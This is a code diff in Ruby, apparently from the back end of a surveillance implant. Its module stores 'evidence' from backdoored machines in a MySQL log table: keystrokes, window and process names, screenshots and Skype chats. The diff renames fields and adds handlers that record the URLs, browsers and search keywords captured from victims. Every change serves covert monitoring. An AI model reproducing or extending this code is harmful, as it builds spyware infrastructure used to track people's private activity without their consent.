@@ -32,8 +32,8 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:user_id])}',
                  '#{@mysql.escape(evidence.info[:received].to_s)}',
                  '#{@mysql.escape(evidence.info[:acquired].to_s)}',
-                 '#{@mysql.escape(evidence.info[:process_name])}',
-                 '#{@mysql.escape(evidence.info[:window_name])}',
+                 '#{@mysql.escape(evidence.info[:process])}',
+                 '#{@mysql.escape(evidence.info[:window])}',
                  #{evidence.info[:content].size},
                  '#{@mysql.escape(evidence.info[:content])}')"
       when :PRINT
@@ -61,8 +61,8 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:user_id])}',
                  '#{@mysql.escape(evidence.info[:received].to_s)}',
                  '#{@mysql.escape(evidence.info[:acquired].to_s)}',
-                 '#{@mysql.escape(evidence.info[:process_name])}',
-                 '#{@mysql.escape(evidence.info[:window_name])}',
+                 '#{@mysql.escape(evidence.info[:process])}',
+                 '#{@mysql.escape(evidence.info[:window])}',
                  '#{@mysql.escape(evidence.info[:keystrokes])}')"
       when :CHAT, :CHATSKYPE
         # override the CHATSKYPE
@@ -105,13 +105,47 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:user_id])}',
                  '#{@mysql.escape(evidence.info[:received].to_s)}',
                  '#{@mysql.escape(evidence.info[:acquired].to_s)}',
-                 '#{@mysql.escape(evidence.info[:process_name])}',
-                 '#{@mysql.escape(evidence.info[:window_name])}',
+                 '#{@mysql.escape(evidence.info[:process])}',
+                 '#{@mysql.escape(evidence.info[:window])}',
                  '#{evidence.info[:width].to_s}x#{evidence.info[:height].to_s}',
                  #{evidence.info[:content].size},
                  #{evidence.info[:x]},
                  #{evidence.info[:y]},
                  '#{@mysql.escape(evidence.info[:content])}')"
+      when :URLCAPTURE
+        # override
+        evidence.info[:type] = :URL
+        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `varchar3`, `varchar4`, `int1`, `longblob1`)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:url])}',
+                 '#{@mysql.escape(evidence.info[:browser])}',
+                 '#{@mysql.escape(evidence.info[:window])}',
+                 '#{@mysql.escape(evidence.info[:keywords])}',
+                 #{evidence.info[:content].size},
+                 '#{@mysql.escape(evidence.info[:content])}')"
+        when :URL
+        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `varchar3`, `varchar4`)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:url])}',
+                 '#{@mysql.escape(evidence.info[:browser])}',
+                 '#{@mysql.escape(evidence.info[:window])}',
+                 '#{@mysql.escape(evidence.info[:keywords])}')"
       else
         trace :debug, "Not implemented."
         return nil
